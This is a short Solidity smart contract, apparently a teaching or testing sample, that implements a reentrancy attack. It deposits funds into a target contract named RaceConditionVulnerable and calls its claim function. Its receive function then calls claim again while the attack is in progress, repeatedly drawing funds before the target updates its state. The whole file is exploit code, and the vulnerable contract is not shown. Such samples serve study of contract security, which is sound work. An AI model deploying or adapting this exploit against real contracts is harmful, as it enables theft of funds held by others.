contract RaceConditionAttacker {
    address public target;
    bool public attackInProgress;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        if (attackInProgress) {
            RaceConditionVulnerable(target).claim(); // re-enter!
        }
    }

    function attack() external payable {
        RaceConditionVulnerable(target).deposit{value: msg.value}();
        attackInProgress = true;
        RaceConditionVulnerable(target).claim();
        attackInProgress = false;
    }
}
